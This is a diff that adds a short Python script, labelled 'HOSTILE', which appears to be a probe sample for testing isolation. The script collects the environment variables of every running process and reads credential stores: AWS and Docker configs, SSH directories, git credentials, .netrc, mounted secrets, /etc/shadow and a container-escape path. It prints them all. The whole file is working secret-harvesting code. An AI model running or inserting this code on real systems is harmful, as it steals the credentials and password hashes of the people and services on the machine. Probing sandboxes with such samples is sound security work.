@@ -1,0 +1,25 @@
+# HOSTILE: look for secrets in the environment, /proc, and common credential locations. argv: host paths.
+import json, os, sys
+
+r = {"environ": dict(os.environ), "proc_environ": {}, "files": {}}
+for pid in os.listdir("/proc"):
+    if pid.isdigit():
+        try:
+            r["proc_environ"][pid] = open(f"/proc/{pid}/environ", "rb").read().decode("utf-8", "replace")
+        except OSError as e:
+            r["proc_environ"][pid] = f"errno {e.errno}"
+paths = sys.argv[1:] + [
+    "/root/.aws/credentials", "/root/.aws", "/root/.docker/config.json", "/root/.ssh", "/home", "/tmp/.aws",
+    os.path.expanduser("~/.aws/credentials"), os.path.expanduser("~/.docker/config.json"), "/run/secrets",
+    "/var/run/secrets", "/etc/shadow", "/.git-credentials", "/root/.git-credentials", "/root/.netrc",
+    "/proc/1/root/root", "/run/desktop", "/etc/docker", "/root/.config",
+]
+for p in paths:
+    try:
+        if os.path.isdir(p):
+            r["files"][p] = sorted(os.listdir(p))[:50]
+        else:
+            r["files"][p] = open(p, "rb").read(4096).decode("utf-8", "replace")
+    except OSError as e:
+        r["files"][p] = f"errno {e.errno}"
+print("RESULT " + json.dumps(r))
